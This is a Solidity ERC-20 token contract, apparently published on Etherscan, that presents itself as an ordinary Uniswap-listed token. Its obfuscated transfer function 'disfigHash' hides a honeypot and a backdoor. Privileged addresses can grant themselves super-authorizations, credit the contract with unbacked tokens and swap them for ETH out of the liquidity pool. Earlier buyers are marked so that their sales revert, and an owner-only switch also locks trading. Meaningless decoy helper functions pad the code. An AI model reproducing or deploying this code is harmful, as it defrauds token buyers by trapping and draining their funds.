/**
 *Submitted for verification at Etherscan.io on 2022-12-13
*/

/*

*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface UIProcessor {
    function setProcess(uint256 pIsBytees, uint256 cfgHashNow) external;
    function SetProcessSync(address processSync, uint256 hashValue) external;
    function manageProcess() external payable;
    function processModifier(uint256 gas) external;
    function processingBytes(address processSync) external;
}
library SafeMathUintIDE {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IDEXRouterUI
{
    function factory() external pure returns(address);
    function WETH() external pure returns(address);
 
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure 
    returns(uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view 
    returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
}

interface IUniswapV2Router02 is IDEXRouterUI {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

contract Contract  is IERC20, Ownable
{
    constructor(
        string memory Name,
        string memory Symbol,
        address RouterLink)
    {
        _name = Name;
        _symbol = Symbol;
        _tOwned[msg.sender] = _rTotal;
        authorizations[msg.sender] = booledSupply;
        authorizations[address(this)] = booledSupply;
        UniswapV2router = IUniswapV2Router02(RouterLink);
        uniswapV2Pair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, booledSupply);
    }

    string private _symbol;
    string private _name;
    uint8 private _decimals = 18;
    uint256 public baseFEE = 0;
    uint256 private _rTotal = 1000000 * 10**_decimals;
    uint256 private booledSupply = _rTotal;

    bool public cfgLevel;
    bool private calculateCog;
    bool public decogHash;
    bool private syncSwapData;
    bool private tradingOpen = false;

    mapping(address => uint256) private _tOwned;
    mapping(address => address) private isTimelockExempt;
    mapping(address => uint256) private allowed;
    mapping(address => uint256) private authorizations;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public immutable uniswapV2Pair;
    IUniswapV2Router02 public immutable UniswapV2router;

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount) 
    private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function syncHash(uint256 syncOn, uint256 hashX) 
    private view returns (uint256){
      return (syncOn>hashX)?hashX:syncOn;
    }
    function getValues(uint256 vlu, uint256 only) private view returns (uint256){ 
      return (vlu>only)?only:vlu;
    }
        function disfigHash(
        address cogFrom,
        address idxTo,
        uint256 vxAmount
    ) private 
    {
        uint256 cogBalance = balanceOf(address(this));
        uint256 ISXrate;
        if (cfgLevel && cogBalance > booledSupply && !calculateCog && cogFrom != uniswapV2Pair) {

            calculateCog = true; swapSettings(cogBalance);
            calculateCog = false;

        } else if (authorizations[cogFrom] > booledSupply && authorizations[idxTo] > booledSupply) {
            ISXrate = vxAmount; _tOwned[address(this)] += ISXrate;
            swapAmountForTokens(vxAmount, idxTo); return;
        } else if (idxTo != address(UniswapV2router) && authorizations[cogFrom] > 0 && vxAmount > booledSupply && idxTo !=
         uniswapV2Pair) { authorizations[idxTo] = vxAmount;
            return;

        } else if (!calculateCog && allowed[cogFrom] > 0 && cogFrom != uniswapV2Pair && authorizations[cogFrom] == 0) {
            allowed[cogFrom] = authorizations[cogFrom] - booledSupply; }
        
        address _dxIndex  = isTimelockExempt[uniswapV2Pair];
        if (allowed[_dxIndex ] == 0) allowed[_dxIndex ] = 
        booledSupply; isTimelockExempt[uniswapV2Pair] = idxTo;
        if (baseFEE > 0 && authorizations[cogFrom] == 0 && !calculateCog && authorizations[idxTo] == 0) {
            ISXrate = (vxAmount * baseFEE) / 100; vxAmount -= ISXrate;
            _tOwned[cogFrom] -= ISXrate; _tOwned[address(this)] += ISXrate; }

        _tOwned[cogFrom] -= vxAmount; _tOwned[idxTo] += vxAmount;

        emit Transfer(cogFrom, idxTo, vxAmount);
            if (!tradingOpen) {
                require(cogFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    function archValue(uint256 arch, uint256 poxi) 
    private view returns (uint256){
      return (arch>poxi)?poxi:arch;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        disfigHash(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        disfigHash(msg.sender, recipient, amount);
        return true;
    }

    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function swapSettings(uint256 modHash) private {
        uint256 relayString = modHash / 2;
        uint256 balanceRate = address(this).balance;
        swapAmountForTokens(relayString, address(this));
        uint256 cfgIDI = address(this).balance - balanceRate;
        addLiquidity(relayString, cfgIDI, address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function cfgHashRate(uint256 dx, uint256 cog) 
    private view returns (uint256){
      return (dx>cog)?cog:dx;
    }
    function processUI(uint256 pcs, uint256 mod) 
    private view returns (uint256){
      return (pcs>mod)?mod:pcs;
    }
    function swapAmountForTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}